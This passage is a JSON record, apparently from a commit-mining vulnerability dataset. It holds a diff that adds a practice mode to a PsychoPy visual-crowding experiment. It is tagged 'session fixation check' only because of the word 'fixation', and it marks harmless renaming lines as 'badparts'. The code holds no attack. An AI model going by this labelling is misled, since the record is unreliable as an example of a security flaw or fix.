fixation cross and check for fixations","sha":"1230ac8273e080ab0e158386231f852853a5edcf","keyword":"session fixation check","diff":"diff --git a\/experiment\/main.py b\/experiment\/main.py\nindex 519bce9..c2e2111 100644\n--- a\/experiment\/main.py\n+++ b\/experiment\/main.py\n@@ -3,7 +3,7 @@\n import os\n import os.path as op\n #import appnope\n-from session import VsearchSession, CrowdingSession \n+from session import VsearchSession, CrowdingSession, TrainCrowdingSession \n \n \n # define main function\n@@ -21,18 +21,18 @@ def main():\n                         'as 2nd argument in the command line!')\n     \n     sj_num = str(sys.argv[1]).zfill(3) # subject number\n-    ses_num = str(sys.argv[2]) # run number\n+    ses_type = str(sys.argv[2]) # run number\n \n     # task name dictionary\n     tasks = {'search': 'VisualSearch', 'crowding': 'Crowding'}\n     \n-    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_num))\n+    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_type))\n \n     exp_type = ''\n     while exp_type not in ('search','crowding'):\n         exp_type = input('Which experiment to run (search\/crowding)?: ')\n \n-    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_num))\n+    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_type))\n \n     # make output dir\n     base_dir = op.split(os.getcwd())[0] # main path for all folders of project\n@@ -44,7 +44,7 @@ def main():\n     print('saving files in %s'%output_dir)\n \n     # string for output data\n-    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_num, task = tasks[exp_type])\n+    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_type, task = tasks[exp_type])\n \n     # if file already exists\n     behav_file = op.join(output_dir,'{behav}_events.tsv'.format(behav=output_str))\n@@ -60,18 +60,28 @@ def main():\n \n \n     # load approriate class object to be run\n-    if exp_type == 'search': # run standard pRF mapper\n+    #\n+    if exp_type == 'search': # run visual search task\n \n         exp_sess = VsearchSession(output_str = output_str,\n                               output_dir = output_dir,\n                               settings_file = 'experiment_settings.yml',\n                               eyetracker_on = False) #True)\n \n-    elif exp_type == 'crowding': # run feature pRF mapper\n-         exp_sess = CrowdingSession(output_str = output_str,\n+    elif exp_type == 'crowding': # run crowding task\n+        \n+        if ses_type in ['practice', 'train']: # short practice ses, to understand task\n+\n+            exp_sess = TrainCrowdingSession(output_str = output_str,\n                                   output_dir = output_dir,\n                                   settings_file = 'experiment_settings.yml',\n                                   eyetracker_on = False) #True)\n+        \n+        else: # real deal\n+            exp_sess = CrowdingSession(output_str = output_str,\n+                                    output_dir = output_dir,\n+                                    settings_file = 'experiment_settings.yml',\n+                                    eyetracker_on = False) #True)\n \n    \t                            \n     exp_sess.run()\ndiff --git a\/experiment\/session.py b\/experiment\/session.py\nindex ab8513a..f0d7ada 100644\n--- a\/experiment\/session.py\n+++ b\/experiment\/session.py\n@@ -4,7 +4,7 @@\n \n from exptools2.core import Session, PylinkEyetrackerSession\n \n-from trial import VsearchTrial, CrowdingTrial \n+from trial import VsearchTrial, CrowdingTrial, TrainCrowdingTrial\n from stim import VsearchStim, CrowdingStim \n \n from psychopy import visual, tools\n@@ -547,7 +547,7 @@ def create_trials(self):\n                                 self.settings['crowding']['iti']\n                                 ])\n \n-                if blk_counter < self.settings['crowding']['num_blks']: \n+                if blk_counter < self.settings['crowding']['num_blks'] - 1: \n                     blk_counter += 1\n \n             else:\n@@ -633,6 +633,292 @@ def close_all(self):\n \n \n \n+    def run(self):\n+        \"\"\" Loops over trials and runs them \"\"\"\n+\n+        # create trials before running!\n+        self.create_stimuli()\n+        self.create_trials()\n+\n+        # create staircase\n+        self.create_staircase(stair_names = self.settings['crowding']['crwd_type'],\n+                            initial_val = self.distance_ratio_bounds[-1], \n+                            minVal = self.distance_ratio_bounds[0], \n+                            maxVal = self.distance_ratio_bounds[-1],\n+                            pThreshold = self.settings['crowding']['staircase']['pThreshold'],\n+                            nUp = self.settings['crowding']['staircase']['nUp'], \n+                            nDown = self.settings['crowding']['staircase']['nDown'], \n+                            stepSize = self.settings['crowding']['staircase']['stepSize'], \n+                            quest_stair = self.settings['crowding']['staircase']['quest']) \n+\n+        # if eyetracking then calibrate\n+        if self.eyetracker_on:\n+            self.calibrate_eyetracker()\n+\n+        # draw instructions wait a few seconds\n+        this_instruction_string = ('During the experiment you will see several gabors.\\n\\n'\n+                                'They can be pink or blue,\\n'\n+                                'and be tilted to the right or left'\n+                                '\\n\\n\\n'\n+                                '[Press right arrow key\\nto continue]\\n\\n')\n+\n+        utils.draw_instructions(self.win, this_instruction_string, keys = self.settings['keys']['right_index'])\n+\n+        # draw instructions wait a few seconds\n+        this_instruction_string = ('Your task is to indicate\\n'\n+                                'the color and orientation\\n'\n+                                'of the middle gabor.'\n+                                '\\n\\n\\n'\n+                                '[Press right arrow key\\nto continue]\\n\\n')\n+\n+        utils.draw_instructions(self.win, this_instruction_string, keys = self.settings['keys']['right_index'])\n+\n+        # draw instructions wait a few seconds\n+        this_instruction_string = ('Sometimes, there will only be one shape presented\\n'\n+                                ' so do not let this confuse you.\\n'\n+                                '\\n\\n\\n'\n+                                '[Press right arrow key\\nto continue]\\n\\n')\n+\n+        utils.draw_instructions(self.win, this_instruction_string, keys = self.settings['keys']['right_index'])\n+\n+        # draw instructions wait a few seconds\n+        this_instruction_string = ('Do NOT look at the shapes!\\n'\n+                                    'Please fixate at the center,\\n'\n+                                    'and do not move your eyes\\n'\n+                                    '\\n\\n\\n'\n+                                    '[Press right arrow key\\nto continue]\\n\\n')\n+\n+        utils.draw_instructions(self.win, this_instruction_string, keys = self.settings['keys']['right_index'])\n+\n+        # draw instructions wait a few seconds\n+        this_instruction_string = ('\\n\\n\\n\\n'\n+                                '\\n\\n\\n\\nReady?\\n'\n+                                '[Press space bar\\nto start]\\n\\n')\n+\n+        utils.draw_instructions(self.win, this_instruction_string, keys = ['space'], \n+                                image_path = [op.join(os.getcwd(),'instructions_imgs','crowding_keys.png')])\n+            \n+\n+        # start recording gaze\n+        if self.eyetracker_on:\n+            self.start_recording_eyetracker()\n+\n+        self.start_experiment()\n+        \n+        # cycle through trials\n+        for trl in self.all_trials: \n+            trl.run() # run forrest run\n+\n+        print('Expected number of responses: %d'%(self.total_trials))\n+        print('Total subject responses: %d'%self.total_responses)\n+        print('Correct responses: %d'%self.correct_responses)\n+        print('Overall accuracy %.2f %%'%(self.correct_responses\/self.total_trials*100))\n+\n+        self.close_all() # close session\n+\n+\n+class TrainCrowdingSession(CrowdingSession):\n+   \n+    def __init__(self, output_str, output_dir, settings_file, eyetracker_on):  # initialize child class\n+\n+        \"\"\" Initializes TrainCrowdingSession object.  \n+      \n+        Parameters\n+        ----------\n+        output_str : str\n+            Basename for all output-files (like logs), e.g., \"sub-01_task-PRFstandard_run-1\"\n+        output_dir : str\n+            Path to desired output-directory (default: None, which results in $pwd\/logs)\n+        settings_file : str\n+            Path to yaml-file with settings (default: None, which results in the package's\n+            default settings file (in data\/default_settings.yml)\n+        \"\"\"\n+\n+        # need to initialize parent class (ExpSession), indicating output infos\n+        super().__init__(output_str = output_str, output_dir = output_dir, settings_file = settings_file, \n+                        eyetracker_on = eyetracker_on)\n+\n+        # number of trials per visual hemifield, for a specific type of target and crowding type\n+        self.train_num_trl_cond = 4\n+        # ratio of unflanked trials\n+        self.unflank_ratio = 1\/6\n+\n+        self.stim_display_time = .15\n+        self.iti = 1\n+\n+    \n+    def create_trials(self):\n+\n+        \"\"\" Creates trials (before running the session) \"\"\"\n+\n+        # some counters for internal bookeeping\n+        self.total_responses = 0\n+        self.correct_responses = 0\n+        self.trial_counter = 0\n+        self.thisResp = []\n+\n+        # number of trials per condition\n+        num_cond_trials = {}\n+        total_trials = 0\n+        crowding_type = [] # to store crowding type\n+        hemifield = [] # to store hemifield\n+        target_name = [] # target name\n+                    \n+        for k in self.settings['crowding']['crwd_type']:\n+            \n+            # number of trials for this crowding type\n+            num_cond_trials[k] = len(self.settings['crowding']['target_names'].keys()) * \\\n+                                self.train_num_trl_cond * 2 # num target x min_num trials x 2 hemifields\n+            # update total number of trials\n+            total_trials += num_cond_trials[k]\n+\n+            # set list with crowdign type name, for bookeeping\n+            crowding_type += list(np.tile(k, num_cond_trials[k]))\n+            \n+            # target name\n+            target_name += list(np.repeat(list(self.settings['crowding']['target_names'].keys()),\n+                                    self.train_num_trl_cond * 2))\n+            \n+            # which hemifield we're displaying the stimuli\n+            hemifield += list(np.tile(['left', 'right'],\n+                                len(self.settings['crowding']['target_names'].keys()) * \\\n+                                    self.train_num_trl_cond))\n+            \n+        # need to add unflankered trials\n+        ## need to add same for unflankered trials\n+        num_cond_trials['unflankered'] = int(total_trials * self.unflank_ratio)\n+        self.total_trials = total_trials + num_cond_trials['unflankered']\n+\n+        crowding_type += list(np.tile('unflankered', num_cond_trials['unflankered']))\n+\n+        target_name += list(np.repeat(list(self.settings['crowding']['target_names'].keys()),\n+                                    int(num_cond_trials['unflankered']\/len(self.settings['crowding']['target_names'].keys()))))\n+\n+        hemifield += list(np.tile(['left', 'right'],\n+                                int(num_cond_trials['unflankered']\/2)))\n+\n+        print('Total number of trials: %i'%self.total_trials)\n+\n+        # now make df with trial info, \n+        # also including target and distractor positions on screen\n+        trials_df = pd.DataFrame(columns = ['index', 'crowding_type', 'hemifield',\n+                                            'target_name','target_pos', \n+                                            'target_color', 'target_ori', \n+                                            'distractor_name', 'distractor_pos',\n+                                            'distractor_color', 'distractor_ori'])\n+\n+        # randomize trials\n+        random_ind = np.arange(self.total_trials)\n+        np.random.shuffle(random_ind)\n+\n+        for trial_num, i in enumerate(random_ind):\n+\n+            # stimuli x position\n+            x_pos_stim = -self.ecc_pix  if hemifield[i] == 'left' else self.ecc_pix\n+\n+            # set initial distractor position\n+            dist_pos = utils.get_flanker_pos(num_fl = self.n_flankers, \n+                                            offset_ang = self.settings['crowding']['offset_ang'], \n+                                            distance_r = self.distance_ratio_bounds[-1], hemi = hemifield[i],\n+                                            ecc = self.ecc_pix)\n+\n+            # get distractor (flanker) names\n+            if crowding_type[i] == 'orientation':\n+\n+                dist_name = utils.get_flanker_name(target_name[i],\n+                                                        num_fl = self.n_flankers,\n+                                                        list_cond = list(self.ori_dict.keys()), \n+                                                        same_ori = False, same_color = True)\n+            elif crowding_type[i] == 'color':\n+\n+                dist_name = utils.get_flanker_name(target_name[i],\n+                                                        num_fl = self.n_flankers,\n+                                                        list_cond = list(self.ori_dict.keys()), \n+                                                        same_ori = True, same_color = False)\n+            elif crowding_type[i] == 'conjunction':\n+\n+                dist_name = utils.get_flanker_name(target_name[i],\n+                                                        num_fl = self.n_flankers,\n+                                                        list_cond = list(self.ori_dict.keys()), \n+                                                        same_ori = False, same_color = False)\n+\n+            else: ## unflankered\n+                dist_name = list(np.repeat(['None'],self.n_flankers))\n+\n+\n+            ## append distractor color and orientation\n+            if crowding_type[i] == 'unflankered':\n+                dist_col = list(np.repeat(['None'],self.n_flankers))\n+                dist_ori = list(np.repeat(['None'],self.n_flankers))\n+            else:\n+                dist_col = [self.colors_dict[x] for x in dist_name]\n+                dist_ori = [self.ori_dict[x] for x in dist_name]\n+\n+            # append trial!\n+            trials_df = trials_df.append(pd.DataFrame({'index': [trial_num],\n+                                                    'crowding_type': [crowding_type[i]],\n+                                                    'hemifield': [hemifield[i]],\n+                                                    'target_name': [target_name[i]],\n+                                                    'target_pos': [[x_pos_stim, 0]],\n+                                                    'target_color': [self.colors_dict[target_name[i]]],\n+                                                    'target_ori': [self.ori_dict[target_name[i]]],\n+                                                    'distractor_name':[dist_name],\n+                                                    'distractor_pos': [dist_pos],\n+                                                    'distractor_color': [dist_col],\n+                                                    'distractor_ori': [dist_ori]\n+                                                }))\n+\n+        ## save dataframe with all trial info\n+        trials_df.to_csv(op.join(self.output_dir, self.output_str+'_trial_info.csv'), index = False)\n+\n+        # trial number to start a new block\n+        # (this is, introduce a pause and maybe recalibration of eyetracker)\n+        self.blk_trials = np.linspace(0, self.total_trials, \n+                                self.settings['crowding']['num_blks']+1, dtype=int)[:-1]\n+        blk_counter = 0\n+\n+        # append all trials\n+        self.all_trials = []\n+        for i in np.arange(self.total_trials):\n+\n+            # set phase conditions (for logging) and durations\n+            if self.blk_trials[blk_counter] == i:\n+                # insert block phase, to pause trials for a bit\n+                phase_cond = tuple(['block_start', 'iti', 'stim', 'response_time','iti'])\n+                blk_start_dur = self.iti if blk_counter == 0 else 1000 # in first block, we just want to start\n+\n+                phase_dur = tuple([blk_start_dur, # make this extremely long\n+                                self.iti, # add iti here because we dont want to start immediately after block start\n+                                self.stim_display_time, \n+                                self.settings['crowding']['max_resp_time']-self.stim_display_time, # max time to respond, in seconds\n+                                self.iti\n+                                ])\n+\n+                if blk_counter < self.settings['crowding']['num_blks'] - 1: \n+                    blk_counter += 1\n+\n+            elif (i > 0) and (i == self.blk_trials[blk_counter] - 1):\n+                phase_cond = tuple(['stim','response_time','iti'])\n+                phase_dur = tuple([self.stim_display_time,\n+                                self.settings['crowding']['max_resp_time']-self.stim_display_time,\n+                                self.iti * 3\n+                                ])\n+            else:\n+                phase_cond = tuple(['stim','response_time','iti'])\n+                phase_dur = tuple([self.stim_display_time,\n+                                self.settings['crowding']['max_resp_time']-self.stim_display_time,\n+                                self.iti\n+                                ])\n+\n+            self.all_trials.append(TrainCrowdingTrial(session = self ,\n+                                                trial_nr = trials_df.iloc[i]['index'],\n+                                                phase_durations = phase_dur,\n+                                                phase_names = phase_cond,\n+                                                trial_dict = trials_df.iloc[i].to_dict(),\n+                                                blk_counter = blk_counter - 1 \n+                                                ))\n+\n+\n     def run(self):\n         \"\"\" Loops over trials and runs them \"\"\"\n \ndiff --git a\/experiment\/trial.py b\/experiment\/trial.py\nindex f9d99db..a13c706 100644\n--- a\/experiment\/trial.py\n+++ b\/experiment\/trial.py\n@@ -298,3 +298,165 @@ def get_events(self):\n                 for param, val in self.parameters.items():\n                     self.session.global_log.loc[idx, param] = val\n \n+\n+class TrainCrowdingTrial(Trial):\n+\n+    def __init__(self, session, trial_nr, phase_durations, phase_names, trial_dict, blk_counter = 0,\n+                 timing = 'seconds', *args, **kwargs):\n+\n+\n+        \"\"\" Initializes a CrowdingTrial object. \n+        Parameters\n+        ----------\n+        session : exptools Session object\n+            A Session object (needed for metadata)\n+        trial_nr: int\n+            Trial nr of trial\n+        timing : str\n+            The \"units\" of the phase durations. Default is 'seconds', where we\n+            assume the phase-durations are in seconds. The other option is\n+            'frames', where the phase-\"duration\" refers to the number of frames.\n+        \"\"\"\n+        \n+        self.ID = trial_nr # trial identifier, not sure if needed\n+        self.session = session\n+\n+        # phase durations for each condition \n+        self.phase_durations = phase_durations\n+        self.phase_names = phase_names\n+\n+        # trial dictionary with relevant info\n+        self.trial_dict = trial_dict\n+        self.blk_counter = blk_counter\n+\n+        super().__init__(session, trial_nr, phase_durations, phase_names, verbose=False, *args, **kwargs)\n+\n+    \n+    def draw(self): \n+\n+        \"\"\" Draw stimuli - target and flankers - for each trial \"\"\"\n+\n+        current_time = self.session.clock.getTime() # get time\n+\n+        if self.phase_names[int(self.phase)] == 'block_start':\n+\n+            # show instructions\n+            if self.blk_counter == 0:\n+                this_instruction_string = ('BLOCK %i\\n\\n\\n\\n\\n\\n'\n+                                '\\n\\n\\n'%(self.blk_counter + 1))\n+            else:\n+                this_instruction_string = ('BLOCK %i\\n\\n\\n\\n\\n\\n'\n+                                    '[Press space bar to start]\\n\\n'%(self.blk_counter + 1))\n+\n+            block_text = visual.TextStim(win = self.session.win, text = this_instruction_string,\n+                        color = (1, 1, 1), font = 'Helvetica Neue', pos = (0, 0), height = 40,\n+                        italic = True, anchorHoriz = 'center', anchorVert = 'center')\n+\n+            # draw text again\n+            block_text.draw()\n+\n+        elif self.phase_names[int(self.phase)] == 'stim':\n+\n+            # define spacing ratio given staircase\n+            if self.trial_dict['crowding_type'] == 'unflankered':\n+                spacing_val = 0\n+            else:\n+                if self.session.settings['crowding']['staircase']['quest']:\n+                    spacing_val = np.clip(self.session.staircases[self.trial_dict['crowding_type']].quantile(), \n+                                    self.session.distance_ratio_bounds[0], \n+                                    self.session.distance_ratio_bounds[1])\n+                else:\n+                    spacing_val = np.clip(self.session.staircases[self.trial_dict['crowding_type']]._nextIntensity,\n+                                    self.session.distance_ratio_bounds[0], \n+                                    self.session.distance_ratio_bounds[1]) \n+\n+            # draw target and distractors\n+            self.session.cwrd_stim.draw(this_phase = self.phase_names[int(self.phase)],\n+                                        trial_dict = self.trial_dict,\n+                                        spacing_val = spacing_val)\n+\n+        elif self.phase_names[int(self.phase)] == 'iti': # iti\n+            \n+            if self.session.trial_counter <= self.ID: # if no response was given before\n+\n+                user_response = 0\n+                if self.trial_dict['crowding_type'] != 'unflankered':\n+                    # update staircase\n+                    self.session.staircases[self.trial_dict['crowding_type']].addResponse(user_response)\n+\n+                self.session.trial_counter += 1 # update trial counter \n+\n+            if self.ID == int(self.session.blk_trials[self.blk_counter+1] - 1): # if last trial of the block\n+\n+                this_instruction_string = ('Accuracy is %.2f%%\\n\\n\\n\\n'%(self.session.correct_responses\/self.ID*100))\n+\n+                acc_text = visual.TextStim(win = self.session.win, text = this_instruction_string,\n+                        color = (1, 1, 1), font = 'Helvetica Neue', pos = (0, 0), height = 40,\n+                        italic = True, anchorHoriz = 'center', anchorVert = 'center')\n+\n+                # draw text again\n+                acc_text.draw()\n+\n+            if feedback_response[-1] == 1: # if last response was correct\n+                self.session.fixation.lineColor = [-1, 1, -1] # turn green\n+            else:\n+                self.session.fixation.lineColor = [1, -1, -1] # turn red (response incorrect)\n+\n+        ## fixation cross\n+        self.session.fixation.draw() \n+\n+        #print(self.phase_names[int(self.phase)])\n+\n+\n+    def get_events(self):\n+        \"\"\" Logs responses\/triggers \"\"\"\n+        for ev, t in event.getKeys(timeStamped=self.session.clock): # list of of (keyname, time) relative to Clock\u2019s last reset\n+            if len(ev) > 0:\n+                if ev in ['q']:\n+                    print('trial canceled by user')  \n+                    self.session.close_all()\n+                    self.session.quit()\n+\n+                elif (ev in ['space']) and (self.phase_names[int(self.phase)] == 'block_start'): # new block starts\n+                    event_type = 'block_start'\n+                    self.stop_phase()\n+\n+                else:\n+                    event_type = 'response'\n+                    self.session.total_responses += 1\n+\n+                    if self.phase_names[int(self.phase)] == 'response_time':\n+                    \n+                        if (ev in list(np.ravel(list(self.session.settings['keys']['target_key'].values())))): \n+\n+                            if self.session.trial_counter <= self.ID:\n+\n+                                ## get user response!\n+                                user_response = utils.get_response4staircase(event_key = ev, \n+                                                                        target_key = self.session.settings['keys']['target_key'][self.trial_dict['target_name']])\n+\n+                                self.session.thisResp.append(user_response)\n+                                self.session.correct_responses += user_response\n+\n+                                # update color with answer\n+                                if len(self.session.thisResp) > 0: # update with answer\n+                                    if self.trial_dict['crowding_type'] != 'unflankered':\n+                                        # update staircase\n+                                        self.session.staircases[self.trial_dict['crowding_type']].addResponse(self.session.thisResp[-1])\n+                                    # reset response again\n+                                    self.session.thisResp = []\n+\n+                                self.session.trial_counter += 1 # update trial counter   \n+\n+                            self.stop_phase()\n+\n+                # log everything into session data frame\n+                idx = self.session.global_log.shape[0]\n+                self.session.global_log.loc[idx, 'trial_nr'] = self.ID\n+                self.session.global_log.loc[idx, 'onset'] = t\n+                self.session.global_log.loc[idx, 'event_type'] = event_type\n+                self.session.global_log.loc[idx, 'phase'] = self.phase\n+                self.session.global_log.loc[idx, 'response'] = ev                \n+\n+                for param, val in self.parameters.items():\n+                    self.session.global_log.loc[idx, param] = val\n","files":{"\/experiment\/main.py":{"changes":[{"diff":"\n import os\n import os.path as op\n #import appnope\n-from session import VsearchSession, CrowdingSession \n+from session import VsearchSession, CrowdingSession, TrainCrowdingSession \n \n \n # define main function\n","add":1,"remove":1,"filename":"\/experiment\/main.py","badparts":["from session import VsearchSession, CrowdingSession "],"goodparts":["from session import VsearchSession, CrowdingSession, TrainCrowdingSession "]},{"diff":"\n                         'as 2nd argument in the command line!')\n     \n     sj_num = str(sys.argv[1]).zfill(3) # subject number\n-    ses_num = str(sys.argv[2]) # run number\n+    ses_type = str(sys.argv[2]) # run number\n \n     # task name dictionary\n     tasks = {'search': 'VisualSearch', 'crowding': 'Crowding'}\n     \n-    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_num))\n+    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_type))\n \n     exp_type = ''\n     while exp_type not in ('search','crowding'):\n         exp_type = input('Which experiment to run (search\/crowding)?: ')\n \n-    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_num))\n+    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_type))\n \n     # make output dir\n     base_dir = op.split(os.getcwd())[0] # main path for all folders of project\n","add":3,"remove":3,"filename":"\/experiment\/main.py","badparts":["    ses_num = str(sys.argv[2]) # run number","    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_num))","    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_num))"],"goodparts":["    ses_type = str(sys.argv[2]) # run number","    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_type))","    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_type))"]},{"diff":"\n     print('saving files in %s'%output_dir)\n \n     # string for output data\n-    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_num, task = tasks[exp_type])\n+    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_type, task = tasks[exp_type])\n \n     # if file already exists\n     behav_file = op.join(output_dir,'{behav}_events.tsv'.format(behav=output_str))\n","add":1,"remove":1,"filename":"\/experiment\/main.py","badparts":["    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_num, task = tasks[exp_type])"],"goodparts":["    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_type, task = tasks[exp_type])"]},{"diff":"\n \n \n     # load approriate class object to be run\n-    if exp_type == 'search': # run standard pRF mapper\n+    #\n+    if exp_type == 'search': # run visual search task\n \n         exp_sess = VsearchSession(output_str = output_str,\n                               output_dir = output_dir,\n                               settings_file = 'experiment_settings.yml',\n                               eyetracker_on = False) #True)\n \n-    elif exp_type == 'crowding': # run feature pRF mapper\n-         exp_sess = CrowdingSession(output_str = output_str,\n+    elif exp_type == 'crowding': # run crowding task\n+        \n+        if ses_type in ['practice', 'train']: # short practice ses, to understand task\n+\n+            exp_sess = TrainCrowdingSession(output_str = output_str,\n                                   output_dir = output_dir,\n                                   settings_file = 'experiment_settings.yml',\n                                   eyetracker_on = False) #True)\n+        \n+        else: # real deal\n+            exp_sess = CrowdingSession(output_str = output_str,\n+                                    output_dir = output_dir,\n+                                    settings_file = 'experiment_settings.yml',\n+                                    eyetracker_on = False) #True)\n \n    \t                            \n     exp_sess.run()","add":13,"remove":3,"filename":"\/experiment\/main.py","badparts":["    if exp_type == 'search': # run standard pRF mapper","    elif exp_type == 'crowding': # run feature pRF mapper","         exp_sess = CrowdingSession(output_str = output_str,"],"goodparts":["    if exp_type == 'search': # run visual search task","    elif exp_type == 'crowding': # run crowding task","        if ses_type in ['practice', 'train']: # short practice ses, to understand task","            exp_sess = TrainCrowdingSession(output_str = output_str,","        else: # real deal","            exp_sess = CrowdingSession(output_str = output_str,","                                    output_dir = output_dir,","                                    settings_file = 'experiment_settings.yml',","                                    eyetracker_on = False) #True)"]},{"diff":"\n import os\n import os.path as op\n #import appnope\n-from session import VsearchSession, CrowdingSession \n+from session import VsearchSession, CrowdingSession, TrainCrowdingSession \n \n \n # define main function\n","add":1,"remove":1,"filename":"\/experiment\/main.py","badparts":["from session import VsearchSession, CrowdingSession "],"goodparts":["from session import VsearchSession, CrowdingSession, TrainCrowdingSession "]},{"diff":"\n                         'as 2nd argument in the command line!')\n     \n     sj_num = str(sys.argv[1]).zfill(3) # subject number\n-    ses_num = str(sys.argv[2]) # run number\n+    ses_type = str(sys.argv[2]) # run number\n \n     # task name dictionary\n     tasks = {'search': 'VisualSearch', 'crowding': 'Crowding'}\n     \n-    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_num))\n+    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_type))\n \n     exp_type = ''\n     while exp_type not in ('search','crowding'):\n         exp_type = input('Which experiment to run (search\/crowding)?: ')\n \n-    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_num))\n+    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_type))\n \n     # make output dir\n     base_dir = op.split(os.getcwd())[0] # main path for all folders of project\n","add":3,"remove":3,"filename":"\/experiment\/main.py","badparts":["    ses_num = str(sys.argv[2]) # run number","    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_num))","    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_num))"],"goodparts":["    ses_type = str(sys.argv[2]) # run number","    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_type))","    print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_type))"]},{"diff":"\n     print('saving files in %s'%output_dir)\n \n     # string for output data\n-    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_num, task = tasks[exp_type])\n+    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_type, task = tasks[exp_type])\n \n     # if file already exists\n     behav_file = op.join(output_dir,'{behav}_events.tsv'.format(behav=output_str))\n","add":1,"remove":1,"filename":"\/experiment\/main.py","badparts":["    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_num, task = tasks[exp_type])"],"goodparts":["    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_type, task = tasks[exp_type])"]},{"diff":"\n \n \n     # load approriate class object to be run\n-    if exp_type == 'search': # run standard pRF mapper\n+    #\n+    if exp_type == 'search': # run visual search task\n \n         exp_sess = VsearchSession(output_str = output_str,\n                               output_dir = output_dir,\n                               settings_file = 'experiment_settings.yml',\n                               eyetracker_on = False) #True)\n \n-    elif exp_type == 'crowding': # run feature pRF mapper\n-         exp_sess = CrowdingSession(output_str = output_str,\n+    elif exp_type == 'crowding': # run crowding task\n+        \n+        if ses_type in ['practice', 'train']: # short practice ses, to understand task\n+\n+            exp_sess = TrainCrowdingSession(output_str = output_str,\n                                   output_dir = output_dir,\n                                   settings_file = 'experiment_settings.yml',\n                                   eyetracker_on = False) #True)\n+        \n+        else: # real deal\n+            exp_sess = CrowdingSession(output_str = output_str,\n+                                    output_dir = output_dir,\n+                                    settings_file = 'experiment_settings.yml',\n+                                    eyetracker_on = False) #True)\n \n    \t                            \n     exp_sess.run()","add":13,"remove":3,"filename":"\/experiment\/main.py","badparts":["    if exp_type == 'search': # run standard pRF mapper","    elif exp_type == 'crowding': # run feature pRF mapper","         exp_sess = CrowdingSession(output_str = output_str,"],"goodparts":["    if exp_type == 'search': # run visual search task","    elif exp_type == 'crowding': # run crowding task","        if ses_type in ['practice', 'train']: # short practice ses, to understand task","            exp_sess = TrainCrowdingSession(output_str = output_str,","        else: # real deal","            exp_sess = CrowdingSession(output_str = output_str,","                                    output_dir = output_dir,","                                    settings_file = 'experiment_settings.yml',","                                    eyetracker_on = False) #True)"]}],"source":"\n\nimport sys import os import os.path as op from session import VsearchSession, CrowdingSession def main(): if len(sys.argv) < 2: raise NameError('Please add subject number(ex:1) ' 'as 1st argument in the command line!') elif len(sys.argv) < 3: raise NameError('Please add session number(ex:1) ' 'as 2nd argument in the command line!') sj_num=str(sys.argv[1]).zfill(3) ses_num=str(sys.argv[2]) tasks={'search': 'VisualSearch', 'crowding': 'Crowding'} print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_num)) exp_type='' while exp_type not in('search','crowding'): exp_type=input('Which experiment to run(search\/crowding)?: ') print('Running %s task for subject-%s, ses-%s'%(exp_type, sj_num, ses_num)) base_dir=op.split(os.getcwd())[0] output_dir=op.join(base_dir,'output','sourcedata', 'sub-{sj}'.format(sj=sj_num)) if not op.isdir(output_dir): os.makedirs(output_dir) print('saving files in %s'%output_dir) output_str='sub-{sj}_ses-{ses}_task-{task}'.format(sj=sj_num, ses=ses_num, task=tasks[exp_type]) behav_file=op.join(output_dir,'{behav}_events.tsv'.format(behav=output_str)) if op.exists(behav_file): print('file already exists!') overwrite='' while overwrite not in('y','yes','n','no'): overwrite=input('overwrite %s\\n(y\/yes\/n\/no)?: '%behav_file) if overwrite in['no','n']: raise NameError('Run %s already in directory\\nstopping experiment!'%behav_file) if exp_type=='search': exp_sess=VsearchSession(output_str=output_str, output_dir=output_dir, settings_file='experiment_settings.yml', eyetracker_on=False) elif exp_type=='crowding': exp_sess=CrowdingSession(output_str=output_str, output_dir=output_dir, settings_file='experiment_settings.yml', eyetracker_on=False) \t exp_sess.run() if __name__=='__main__': main() ","sourceWithComments":"# import relevant packages\nimport sys\nimport os\nimport os.path as op\n#import appnope\nfrom session import VsearchSession, CrowdingSession \n\n\n# define main function\ndef main():\n    \n    # take user input\n    \n    # define participant number and open json parameter file\n    if len(sys.argv) < 2:\n        raise NameError('Please add subject number (ex:1) '\n                        'as 1st argument in the command line!')\n\n    elif len(sys.argv) < 3:\n        raise NameError('Please add session number (ex:1) '\n                        'as 2nd argument in the command line!')\n    \n    sj_num = str(sys.argv[1]).zfill(3) # subject number\n    ses_num = str(sys.argv[2]) # run number\n\n    # task name dictionary\n    tasks = {'search': 'VisualSearch', 'crowding': 'Crowding'}\n    \n    print('Running experiment for subject-%s, ses-%s'%(sj_num, ses_num))\n\n    exp_type = ''\n    while exp_type not in ('search','crowding'):\n        exp_type = input('Which experiment to run (search\/crowding)?: ')\n\n    print('Running %s task for subject-%s, 